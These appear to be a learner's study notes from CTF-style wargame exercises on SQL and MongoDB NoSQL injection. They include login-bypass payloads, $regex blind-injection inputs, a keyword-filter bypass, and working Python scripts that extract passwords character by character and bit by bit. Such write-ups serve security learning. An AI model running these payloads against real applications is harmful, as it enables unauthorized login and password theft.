## RDBMS : Relational Database Management System

> RDBMS has limit of capacity because it use second-dementional table.
> To check server status in mysql:
> ```terminal
> netstat -an |grep LISTEN
> ```

## NRDBMS : Non - RDBMS (NoSQL)

#### NoSQL also generate query dynamically -> sqli can cause.

#### NoSQL use key-value storing method while RDBMS use TABLE. -> Optimized store capacity.

<br/>

# SQL injection : in raw query which created dynamically

## If you want to create RawQuery dynamically, use Prepared Statement and Object Relational Mapping

> Prepared Statement : during taking dynamic query, it analyze query itself and then regenerate safe query.

### example of raw query code )

```py
res = query_db(f'select * from users where userid="{userid}" and userpassword = "{userpassword}"')
```

In this code, the query generated including user's input so that sqli can evoke.

### example of exploit of this code )

```sql
admin" --
```

in form of userid we can use this exploit to login for admin

## NoSQL injection : same with normal sqli except the point that NoSQL has different syntax.

```js
app.get('/query', function(req,res) {
    db.collection('user').findOne({
        'uid': req.body.uid,
        'upw': req.body.upw
    }, function(err, result){
        if (err) throw err;
        console.log(result);
        if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
```

in this code, we can use sqli.

```sql
#blind sqli
{"uid": "admin", "upw": {"$regex":".{5}"}}
{"uid": "admin", "upw": {"$regex":"^a"}}
{"uid": "admin", "upw": {"$regex":"^aa"}}
{"uid": "admin", "upw": {"$regex":"^ab"}}
...
{"uid": "admin", "upw": {"$regex":"^apple$"}}
```

this is the repeat of substitution.

> $regex : select document which corresponds with regular expression
<br/>

## SQL Features

#### `UNION` : Link multiple `select`

> Cautions : <li> Result of each linked `select` should have same number of columns. </li>
>
> <li> The data type of each linked `select` should same with each other.(applied only some dbms like mssql) </li>

#### `Subquery` : usage of inner query in a query.

> We can access other table the query not take, by use it. Also, we can use `select` where it is not used.  
> Cautions :
>
> <li> Result of subquery should return __single row__ and __single column__ in the `columns` clause </li>  
> <li> Result of subquery can return __multiple row__ and __multiple columns__ in the `FROM` cluase</li>  
> <li> Result of subquery can return __multiple row__ in the `WHERE` clause</li>

#### `Applicaiton Logic`

> by analyzing logic of web application, we can attack with `union`, `if()` and etc.... <- whether logic has output or not is very important to us.
<br/>

## Below exercise is set to MongoDB.

### It has filter like below.

#### filter )

```js
filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}
#It returns True if banned keyword is included in your input.
```

### But keyword filtering system is not secure. We can use sqli untill the fundamental vulerabililty exists.

> filtering is easily paralyzed by using regular expression "." that mean every character. ex) admin -> ad.in , DH{ -> D.{

### Here is the exploit code use blind sqli )

```py
import requests, string

HOST = 'http://host3.dreamhack.games:13265'
SUCCESS = 'admin'
ALPHANUMERIC = string.digits + string.ascii_letters

i = 1
while True:
    res = requests.get(f'{HOST}/login?uid[$regex]=adm&upw[$regex]=.{{{i}}}')
    if res.text == SUCCESS:
        i += 1
    else:
        i -= 1
        break;
print(f'length of password : {i}')

flag = ''
for k in range(i-4):
    for ch in ALPHANUMERIC:
        res = requests.get(f'{HOST}/login?uid[$regex]=adm&upw[$regex]=D.{{{flag}{ch}')
        if res.text == SUCCESS:
            flag += ch
            break

print(f'flag : DH{{{flag}}}')
```

first, code find the length of the password and then, using for loop with range(LENGTH OF PWD), find flag by repeating substition.
<br/>

## ExploitTech : blind sqli advanced

#### Binary Search : **_Binary Search based on a assumtion that data is sorted._** Set range(n,m). As example, let range as (0,100). This method compare target data with middle-orderd data, and regenerate data range (0,50) if target <= middle else range(51, 100). repeat it so that target be captured

> example
>
> ```sql
> mysql> select * from users where username='admin' and ascii(substr(password, 1, 1))>79;
> /* This exploit compare first word of password with ascii_middle_value:79 */
> ```

#### Bit Calculation : ascii letter can express range from 0 to 127 so that we can express it also with 7 bit. By using repeat of exploit statement including useful function like `bin` and `substr`, we can find password

> example
>
> ```sql
> mysql> select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
> mysql> select * from users where username='admin' and substr(bin(ord(password)),2,1)=1;
> ...
> mysql> select * from users where username='admin' and substr(bin(ord(password)),7,1)=1;
> ```
<br />

## Exercise : blind sqli advanced  
#### step 1. find length of password  
```py
def find_length():
    i = 1;
    while True:
        query = f"admin' and upw regexp '.{{{i}}}"
        resp = requests.get(f"{host}?uid={query}")
        if 'exist' not in resp.text:
            return i-1;
        i += 1
```
#### step 2. find bit length of each password character  
```py
def find_bit_length():
    bit_length_db=[]
    for i in range(1, 14):
        bit_length = 0
        while True:
            query = f"admin' and char_length(bin(ord(substr(upw, {i},1)))) = '{bit_length}"
            resp = requests.get(f"{host}?uid={query}")
            if 'exist' in resp.text:
                #print(bit_length)
                bit_length_db.append(bit_length)
                break;
            bit_length+=1
```
#### step 3. extract bits of each password character  
```py
bits_db=[]
for i in range(1, 14):
    bits=''
    for j in range(1, bit_length_db[i-1]+1):
        query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))),{j},1) = '1"
        resp = requests.get(f"{host}?uid={query}")
        if 'exist' in resp.text:
            bits+='1'
        else:
            bits+='0'
    bits_db.append(bits)
print(bits_db)
```
#### step 4. convert bits to letter  
> To convert bits to letter  
> step 4-1. convert bits to int  
> step 4-2. convert int to Big Endian formed string  
> step 4-3. encoding
```py
flag = ''
for i in range(13):
    flag += int.to_bytes(int(bits_db[i],2), length=bit_length_db[i]+7 // 8, byteorder='big').decode()
print(flag)
```  

I didn't think about `step 2` fully, and `step 3` and `step 4` were hard to me to code.  
But the concept of step 2 is important I think. I try without this concept. Thanks to it, I was confused with what bytes the character has.  
So I used for-loop so that the bytes is fixed at one in python exploit code. In fact, ascii only take 1-byte while korean take 3-bytes in utf-8.  
To solve it, use while-loop like `step 1` to take non-fixed length bits by ascending count var(like `bit_length+=1`).